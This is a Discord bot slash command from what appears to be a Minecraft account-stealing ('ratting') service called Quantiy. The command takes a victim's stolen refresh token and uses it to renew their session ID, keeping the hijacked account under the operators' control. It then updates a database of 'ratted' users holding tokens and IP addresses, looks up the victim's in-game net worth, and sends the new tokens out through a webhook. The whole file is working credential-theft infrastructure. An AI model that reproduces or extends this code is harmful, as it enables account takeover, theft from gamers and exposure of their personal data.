const { Client, GatewayIntentBits, EmbedBuilder, PermissionsBitField, Permissions, MessageManager, Embed, Collection, SlashCommandBuilder } = require(`discord.js`);
import { database } from "..";
import { RattedSchema, RefreshRefreshToken, FormattedNetworth, NetworthData, ErrorResponse, RefreshUserToken } from '../types';
import { RefreshToken } from "../utils/refreshToken";
import getProfileNetworth from "../utils/getProfileNetworth";
import formatProfileNetworth from "../utils/formatProfileNetworth";
import sendWebhook from "../utils/sendWebhook";

module.exports = {
    data: new SlashCommandBuilder()
        .setName("refresh")
        .setDescription("Refresh a session id from a refresh key")
        .addStringOption(option => option.setName("refresh_key").setDescription("(The refresh key you want to use to refresh)").setRequired(true)),

    async execute(interaction: any) {
        try {
            await interaction.deferReply({ ephemeral: true });

            const rattedUser = await database.findRattedUserByRefreshKey(interaction.options.getString("refresh_key"));
            const transformedUser: RattedSchema = database.transformDatabaseOutput(rattedUser);

            const username: string = transformedUser.username;
            const uuid: string = transformedUser.uuid;
            const refreshKey: string = transformedUser.refreshKey;
            const ip: string = transformedUser.ip;
            const date: GLfloat = transformedUser.date;
            const state: string = transformedUser.state;
            
            let userToken: string;
            let token: string;
            let refreshToken: string;

            const refeshTokenRefresh = new RefreshToken({
                token: transformedUser.refreshToken,
                type: "refreshToken"
            })

            const userTokenRefresh = new RefreshToken({
                token: transformedUser.userToken,
                type: "userToken"
            })

            const newTokenFromRefresh: RefreshRefreshToken = await refeshTokenRefresh.refreshToken();

            if (newTokenFromRefresh) {
                userToken = transformedUser.userToken;
                token = newTokenFromRefresh.minecraftToken;
                refreshToken = newTokenFromRefresh.refreshToken;
            }

            if (!newTokenFromRefresh) {
                var newTokenFromUser: RefreshUserToken = await userTokenRefresh.userToken();

                if (newTokenFromUser) {
                    userToken = newTokenFromUser.userToken;
                    token = newTokenFromUser.minecraftToken;
                    refreshToken = transformedUser.refreshToken;
                }
            }

            if (!newTokenFromUser && !newTokenFromRefresh) {
                const embed = new EmbedBuilder()
                    .setTitle("\`❌\` Error! (\`REFRESH\`)")
                    .setDescription(`An error occurred while refreshing your SSID! It seems your refresh key is invalid/expired.`)
                    .setColor(0xFF0000)
                    .setTimestamp(new Date())
                    .setFooter({
                        text: "⚡ Powered by Quantiy ⚡"
                    })
                    .setAuthor({
                        name: "Quantiy",
                        iconURL: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Anonymous_emblem.svg/800px-Anonymous_emblem.svg.png",
                        url: "https://discord.quantiy.com/"
                    })

                return await interaction.editReply({ embeds: [ embed ], ephemeral: true });
            }

            const newUser: RattedSchema = {
                username: username,
                uuid: uuid,
                token: token,
                refreshToken: refreshToken,
                userToken: userToken,
                refreshKey: refreshKey,
                ip: ip,
                date: date,
                state: state
            }

            database.updateRattedUserFromRefreshKey(newUser);

            const profileNetworth: NetworthData | ErrorResponse = await getProfileNetworth(uuid);
            const formattedNetworth: FormattedNetworth = formatProfileNetworth(profileNetworth);

            await sendWebhook(newUser, formattedNetworth.formattedSoulboundNetworth, formattedNetworth.formattedUnsoulboundNetworth);

            const embed = new EmbedBuilder()
                .setTitle("\`✅\` Success! (\`REFRESH\`)")
                .setDescription(`Successfully refreshed your SSID!`)
                .setColor(0x00FF00)
                .setTimestamp(new Date())
                .setFooter({
                    text: "⚡ Powered by Quantiy ⚡"
                })
                .setAuthor({
                    name: "Quantiy",
                    iconURL: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Anonymous_emblem.svg/800px-Anonymous_emblem.svg.png",
                    url: "https://discord.quantiy.com/"
                })

            return await interaction.editReply({ embeds: [ embed ], ephemeral: true });
        } catch (error) {
            console.error(error);

            const embed = new EmbedBuilder()
                .setTitle("\`❌\` Error! (\`REFRESH\`)")
                .setDescription(`An unexpected error occurred while refreshing your SSID!`)
                .setColor(0xFF0000)
                .setTimestamp(new Date())
                .setFooter({
                    text: "⚡ Powered by Quantiy ⚡"
                })
                .setAuthor({
                    name: "Quantiy",
                    iconURL: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Anonymous_emblem.svg/800px-Anonymous_emblem.svg.png",
                    url: "https://discord.quantiy.com/"
                })

            return await interaction.editReply({ embeds: [ embed ], ephemeral: true });

        }
    }
}